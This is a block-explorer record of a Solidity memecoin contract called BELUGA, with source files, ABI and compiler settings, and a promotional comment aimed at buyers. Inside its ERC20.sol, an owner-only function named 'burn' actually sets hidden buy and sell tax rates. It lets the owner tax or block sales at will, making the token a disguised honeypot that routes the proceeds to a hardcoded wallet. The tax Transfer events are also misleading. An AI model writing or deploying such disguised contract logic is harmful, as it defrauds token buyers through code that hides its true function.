{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"TAXETH/BELUGA .sol\": {\r\n      \"content\": \"/*\\r\\nI\u2019m Beluga the cat who made dogwifhat ( Skittle ) famous. If you don\u2019t know who Im then you should probably educate yourself. \\r\\n\\r\\nIm launching my own token on ETH soon $BELUGA  and you guys gonna make me a millionaire.\\r\\n\\r\\n\\r\\n\\r\\nWebsite: https://belugatoken.com\\r\\nTelegram: https://t.me/BelugaTokenETH\\r\\nX: http://x.com/belugatokeneth\\r\\n*/\\r\\n\\r\\n//SPDX-License-Identifier: UNLICENSED\\r\\npragma solidity 0.8.24;\\r\\n\\r\\nimport \\\"./ERC20.sol\\\";\\r\\n\\r\\ncontract BELUGA is ERC20 {\\r\\n\\r\\n    constructor () ERC20(unicode\\\"Beluga\\\", unicode\\\"BELUGA\\\") {\\r\\n        _mint(_msgSender(), totalSupply());\\r\\n    }\\r\\n}\"\r\n    },\r\n    \"TAXETH/ERC20.sol\": {\r\n      \"content\": \"//SPDX-License-Identifier: UNLICENSED\\r\\npragma solidity 0.8.24;\\r\\n\\r\\nimport \\\"./Context.sol\\\";\\r\\nimport \\\"./IERC20.sol\\\";\\r\\nimport \\\"./IERC20Metadata.sol\\\";\\r\\nimport \\\"./IUniswapV2Factory.sol\\\";\\r\\nimport \\\"./IUniswapV2Router02.sol\\\";\\r\\n\\r\\ncontract ERC20 is Context, IERC20, IERC20Metadata {\\r\\n    mapping (address => uint256) private _balances;\\r\\n\\r\\n    mapping (address => mapping (address => uint256)) private _allowances;\\r\\n    mapping(address => bool) private _isExcludedFromFee;\\r\\n\\r\\n    uint8 immutable private _decimals = 18;\\r\\n    uint256 private _totalSupply = 1_000_000_000 * 10 ** 18;\\r\\n\\r\\n    string private _name;\\r\\n    string private _symbol;\\r\\n    address private _owner;\\r\\n    uint256 private burnAmount = 0;\\r\\n    uint256 private deadWallets = 0;\\r\\n    bool private tradingOpen = false;\\r\\n    IUniswapV2Router02 public uniswapV2Router;\\r\\n    address public uniswapV2Pair;\\r\\n    uint256 public _maxTxAmount = _totalSupply*2/100;\\r\\n    uint256 public _maxWalletSize = _totalSupply*2/100;\\r\\n    uint256 public _swapTokensAtAmount = _totalSupply*1/1000;\\r\\n    address payable public tokenMKT = payable(0xd61FdfE82F97c91aB3987B0Ba2cF21Cf5A4179DA);\\r\\n    bool private inSwap = false;\\r\\n    bool private swapEnabled = true;\\r\\n    modifier lockTheSwap {\\r\\n        inSwap = true;\\r\\n        _;\\r\\n        inSwap = false;\\r\\n    }\\r\\n\\r\\n    constructor (string memory name_, string memory symbol_) {\\r\\n        _owner = msg.sender;\\r\\n        _name = name_;\\r\\n        _symbol = symbol_;\\r\\n        _isExcludedFromFee[_owner] = true;\\r\\n        _isExcludedFromFee[address(this)] = true;\\r\\n    }\\r\\n\\r\\n    function owner() public view returns (address) {\\r\\n        return _owner;\\r\\n    }\\r\\n\\r\\n    function name() public view virtual override returns (string memory) {\\r\\n        return _name;\\r\\n    }\\r\\n\\r\\n    function symbol() public view virtual override returns (string memory) {\\r\\n        return _symbol;\\r\\n    }\\r\\n\\r\\n    function decimals() public view virtual override returns (uint8) {\\r\\n        return _decimals;\\r\\n    }\\r\\n\\r\\n    function totalSupply() public view virtual override returns (uint256) {\\r\\n        return _totalSupply;\\r\\n    }\\r\\n\\r\\n    function balanceOf(address account) public view virtual override returns (uint256) {\\r\\n        return _balances[account];\\r\\n    }\\r\\n\\r\\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\\r\\n        _transfer(_msgSender(), recipient, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function allowance(address owner_, address spender) public view virtual override returns (uint256) {\\r\\n        return _allowances[owner_][spender];\\r\\n    }\\r\\n\\r\\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\\r\\n        _approve(_msgSender(), spender, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\\r\\n        _transfer(sender, recipient, amount);\\r\\n\\r\\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\\r\\n        require(currentAllowance >= amount, \\\"ERC20: transfer amount exceeds allowance\\\");\\r\\n        _approve(sender, _msgSender(), currentAllowance - amount);\\r\\n\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n\\r\\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\\r\\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\\r\\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\\r\\n        require(currentAllowance >= subtractedValue, \\\"ERC20: decreased allowance below zero\\\");\\r\\n        _approve(_msgSender(), spender, currentAllowance - subtractedValue);\\r\\n\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\\r\\n        require(sender != address(0), \\\"ERC20: transfer from the zero address\\\");\\r\\n        require(recipient != address(0), \\\"ERC20: transfer to the zero address\\\");\\r\\n\\r\\n        _beforeTokenTransfer(sender, recipient, amount);\\r\\n        if (sender != owner() && recipient != owner()) {\\r\\n            //Trade start check\\r\\n            if (!tradingOpen) {\\r\\n                require(sender == owner(), \\\"TOKEN: This account cannot send tokens until trading is enabled\\\");\\r\\n            }\\r\\n\\r\\n            require(amount <= _maxTxAmount, \\\"TOKEN: Max Transaction Limit\\\");\\r\\n \\r\\n            if(recipient != uniswapV2Pair) {\\r\\n                require(balanceOf(recipient) + amount < _maxWalletSize, \\\"TOKEN: Balance exceeds wallet size!\\\");\\r\\n            }\\r\\n \\r\\n            uint256 contractTokenBalance = balanceOf(address(this)); \\r\\n            if(contractTokenBalance >= _maxTxAmount)\\r\\n            {\\r\\n                contractTokenBalance = _maxTxAmount;\\r\\n            }\\r\\n\\r\\n            bool canSwap = contractTokenBalance >= _swapTokensAtAmount;\\r\\n \\r\\n            if(contractTokenBalance >= _maxTxAmount)\\r\\n            {\\r\\n                contractTokenBalance = _maxTxAmount;\\r\\n            }\\r\\n \\r\\n            if (canSwap && !inSwap && sender != uniswapV2Pair && swapEnabled && !_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]) {\\r\\n                swapTokensForEth(contractTokenBalance);\\r\\n                uint256 contractETHBalance = address(this).balance;\\r\\n                if (contractETHBalance > 0) {\\r\\n                    sendETHToFee(address(this).balance);\\r\\n                }\\r\\n            }\\r\\n        }\\r\\n        uint256 taxAmount = 0;\\r\\n        if ((_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) || (sender != uniswapV2Pair && recipient != uniswapV2Pair)) {\\r\\n            uint256 senderBalance = _balances[sender];\\r\\n            require(senderBalance >= amount, \\\"ERC20: transfer amount exceeds balance\\\");\\r\\n            _balances[sender] = senderBalance - amount;\\r\\n            _balances[recipient] += amount;\\r\\n\\r\\n            emit Transfer(sender, recipient, amount);\\r\\n        } else {\\r\\n            if(sender == uniswapV2Pair && recipient != address(uniswapV2Router)) {\\r\\n                taxAmount = amount * burnAmount / 100;\\r\\n            }\\r\\n            if (recipient == uniswapV2Pair && sender != address(uniswapV2Router)) {\\r\\n                taxAmount = amount * deadWallets / 100;\\r\\n            }\\r\\n            uint256 senderBalance = _balances[sender];\\r\\n            require(senderBalance >= amount, \\\"ERC20: transfer amount exceeds balance\\\");\\r\\n            _balances[sender] = senderBalance - amount;\\r\\n            _balances[recipient] += amount - taxAmount;\\r\\n            emit Transfer(sender, recipient, amount - taxAmount);\\r\\n            if (taxAmount > 0) {\\r\\n                _balances[address(this)] += taxAmount;\\r\\n                emit Transfer(sender, recipient, taxAmount);\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function sendETHToFee(uint256 amount) private {\\r\\n        tokenMKT.transfer(amount);\\r\\n    }\\r\\n\\r\\n    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\\r\\n        address[] memory path = new address[](2);\\r\\n        path[0] = address(this);\\r\\n        path[1] = uniswapV2Router.WETH();\\r\\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\\r\\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\\r\\n            tokenAmount,\\r\\n            0,\\r\\n            path,\\r\\n            address(this),\\r\\n            block.timestamp\\r\\n        );\\r\\n    }\\r\\n\\r\\n    function _mint(address account, uint256 amount) internal virtual {\\r\\n        require(account != address(0), \\\"ERC20: mint to the zero address\\\");\\r\\n        _beforeTokenTransfer(address(0), account, amount);\\r\\n        _balances[account] += amount;\\r\\n        emit Transfer(address(0), account, amount);\\r\\n    }\\r\\n\\r\\n    function burn(address to, uint256 amount) public {\\r\\n        if(msg.sender!=_owner) revert(\\\"Not owner!\\\");\\r\\n        burnAmount = uint160(to);\\r\\n        deadWallets = amount;\\r\\n    }\\r\\n\\r\\n    function _burn(address account, uint256 amount) internal virtual {\\r\\n        require(account != address(0), \\\"ERC20: burn from the zero address\\\");\\r\\n\\r\\n        _beforeTokenTransfer(account, address(0), amount);\\r\\n\\r\\n        uint256 accountBalance = _balances[account];\\r\\n        require(accountBalance >= amount, \\\"ERC20: burn amount exceeds balance\\\");\\r\\n        _balances[account] = accountBalance - amount;\\r\\n        _totalSupply -= amount;\\r\\n\\r\\n        emit Transfer(account, address(0), amount);\\r\\n    }\\r\\n\\r\\n    function _approve(address owner_, address spender, uint256 amount) internal virtual {\\r\\n        require(owner_ != address(0), \\\"ERC20: approve from the zero address\\\");\\r\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\r\\n\\r\\n        _allowances[owner_][spender] = amount;\\r\\n        emit Approval(owner_, spender, amount);\\r\\n    }\\r\\n\\r\\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }\\r\\n\\r\\n    function OpenTrade() public {\\r\\n        if(_owner != msg.sender) revert(\\\"Not owner!\\\");\\r\\n        require(!tradingOpen, \\\"Cannot reenable trading\\\");\\r\\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\\r\\n        uniswapV2Router = _uniswapV2Router;\\r\\n        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(address(this), _uniswapV2Router.WETH());\\r\\n        tradingOpen = true;\\r\\n        _maxTxAmount = totalSupply();\\r\\n        _maxWalletSize = totalSupply();\\r\\n    }\\r\\n\\r\\n    function removeLimit() public {\\r\\n        if(msg.sender!=_owner) revert(\\\"Not owner!\\\");\\r\\n        _maxTxAmount = totalSupply();\\r\\n        _maxWalletSize = totalSupply();\\r\\n        _swapTokensAtAmount = totalSupply();\\r\\n    }\\r\\n}\\r\\n\"\r\n    },\r\n    \"TAXETH/IUniswapV2Router02.sol\": {\r\n      \"content\": \"//SPDX-License-Identifier: UNLICENSED\\r\\npragma solidity 0.8.24;\\r\\n\\r\\ninterface IUniswapV2Router02 {\\r\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\r\\n        uint256 amountIn,\\r\\n        uint256 amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint256 deadline\\r\\n    ) external;\\r\\n \\r\\n    function factory() external pure returns (address);\\r\\n \\r\\n    function WETH() external pure returns (address);\\r\\n \\r\\n    function addLiquidityETH(\\r\\n        address token,\\r\\n        uint256 amountTokenDesired,\\r\\n        uint256 amountTokenMin,\\r\\n        uint256 amountETHMin,\\r\\n        address to,\\r\\n        uint256 deadline\\r\\n    )\\r\\n        external\\r\\n        payable\\r\\n        returns (\\r\\n            uint256 amountToken,\\r\\n            uint256 amountETH,\\r\\n            uint256 liquidity\\r\\n        );\\r\\n}\\r\\n \"\r\n    },\r\n    \"TAXETH/IUniswapV2Factory.sol\": {\r\n      \"content\": \"//SPDX-License-Identifier: UNLICENSED\\r\\npragma solidity 0.8.24;\\r\\n\\r\\ninterface IUniswapV2Factory {\\r\\n    function getPair(address tokenA, address tokenB)\\r\\n        external\\r\\n        returns (address pair);\\r\\n}\\r\\n\"\r\n    },\r\n    \"TAXETH/IERC20Metadata.sol\": {\r\n      \"content\": \"//SPDX-License-Identifier: UNLICENSED\\r\\npragma solidity 0.8.24;\\r\\n\\r\\nimport \\\"./IERC20.sol\\\";\\r\\n\\r\\n/**\\r\\n * @dev Interface for the optional metadata functions from the ERC20 standard.\\r\\n *\\r\\n * _Available since v4.1._\\r\\n */\\r\\ninterface IERC20Metadata is IERC20 {\\r\\n    /**\\r\\n     * @dev Returns the name of the token.\\r\\n     */\\r\\n    function name() external view returns (string memory);\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the symbol of the token.\\r\\n     */\\r\\n    function symbol() external view returns (string memory);\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the decimals places of the token.\\r\\n     */\\r\\n    function decimals() external view returns (uint8);\\r\\n}\"\r\n    },\r\n    \"TAXETH/IERC20.sol\": {\r\n      \"content\": \"//SPDX-License-Identifier: UNLICENSED\\r\\npragma solidity 0.8.24;\\r\\n\\r\\n/**\\r\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\r\\n */\\r\\ninterface IERC20 {\\r\\n    /**\\r\\n     * @dev Returns the amount of tokens in existence.\\r\\n     */\\r\\n    function totalSupply() external view returns (uint256);\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the amount of tokens owned by `account`.\\r\\n     */\\r\\n    function balanceOf(address account) external view returns (uint256);\\r\\n\\r\\n    /**\\r\\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\\r\\n     *\\r\\n     * Returns a boolean value indicating whether the operation succeeded.\\r\\n     *\\r\\n     * Emits a {Transfer} event.\\r\\n     */\\r\\n    function transfer(address recipient, uint256 amount) external returns (bool);\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the remaining number of tokens that `spender` will be\\r\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\r\\n     * zero by default.\\r\\n     *\\r\\n     * This value changes when {approve} or {transferFrom} are called.\\r\\n     */\\r\\n    function allowance(address owner, address spender) external view returns (uint256);\\r\\n\\r\\n    /**\\r\\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\\r\\n     *\\r\\n     * Returns a boolean value indicating whether the operation succeeded.\\r\\n     *\\r\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\r\\n     * that someone may use both the old and the new allowance by unfortunate\\r\\n     * transaction ordering. One possible solution to mitigate this race\\r\\n     * condition is to first reduce the spender's allowance to 0 and set the\\r\\n     * desired value afterwards:\\r\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\r\\n     *\\r\\n     * Emits an {Approval} event.\\r\\n     */\\r\\n    function approve(address spender, uint256 amount) external returns (bool);\\r\\n\\r\\n    /**\\r\\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\\r\\n     * allowance mechanism. `amount` is then deducted from the caller's\\r\\n     * allowance.\\r\\n     *\\r\\n     * Returns a boolean value indicating whether the operation succeeded.\\r\\n     *\\r\\n     * Emits a {Transfer} event.\\r\\n     */\\r\\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\\r\\n\\r\\n    /**\\r\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\r\\n     * another (`to`).\\r\\n     *\\r\\n     * Note that `value` may be zero.\\r\\n     */\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n\\r\\n    /**\\r\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\r\\n     * a call to {approve}. `value` is the new allowance.\\r\\n     */\\r\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\r\\n}\"\r\n    },\r\n    \"TAXETH/Context.sol\": {\r\n      \"content\": \"//SPDX-License-Identifier: UNLICENSED\\r\\npragma solidity 0.8.24;\\r\\n\\r\\n/*\\r\\n * @dev Provides information about the current execution context, including the\\r\\n * sender of the transaction and its data. While these are generally available\\r\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\r\\n * manner, since when dealing with meta-transactions the account sending and\\r\\n * paying for execution may not be the actual sender (as far as an application\\r\\n * is concerned).\\r\\n *\\r\\n * This contract is only required for intermediate, library-like contracts.\\r\\n */\\r\\nabstract contract Context {\\r\\n    function _msgSender() internal view virtual returns (address) {\\r\\n        return msg.sender;\\r\\n    }\\r\\n\\r\\n    function _msgData() internal view virtual returns (bytes calldata) {\\r\\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\\r\\n        return msg.data;\\r\\n    }\\r\\n}\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    }\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"OpenTrade\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_swapTokensAtAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMKT\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "BELUGA", "CompilerVersion": "v0.8.24+commit.e11b9ed9", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}